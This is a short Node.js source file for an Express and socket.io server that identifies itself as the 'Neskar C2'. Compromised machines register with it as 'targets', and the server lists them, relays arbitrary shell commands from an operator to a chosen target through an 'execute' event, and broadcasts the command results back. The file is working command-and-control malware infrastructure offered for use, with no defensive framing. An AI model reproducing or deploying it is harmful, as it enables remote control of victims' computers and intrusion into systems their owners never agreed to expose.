const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static('./'));
app.use(express.json());

let targets = {};

app.get('/', (req, res) => res.render('index.html', { error: null }));

io.on('connection', (socket) => {
    socket.on('register_target', (data) => {
        socket.targetId = data.id;
        targets[data.id] = { 
            id: data.id, 
            info: data.info, 
            socketId: socket.id,
            status: "ONLINE"
        };
        io.emit('update_list', Object.values(targets));
    });

    socket.on('send_cmd', (data) => {
        if (targets[data.targetId]) {
            io.to(targets[data.targetId].socketId).emit('execute', { cmd: data.cmd });
        }
    });

    socket.on('cmd_result', (data) => {
        io.emit('log_result', data);
    });

    socket.on('disconnect', () => {
        for (let id in targets) {
            if (targets[id].socketId === socket.id) {
                delete targets[id];
                break;
            }
        }
        io.emit('update_list', Object.values(targets));
    });
});

server.listen(3000, '0.0.0.0', () => console.log('Neskar C2 Active on Port 3000!'));
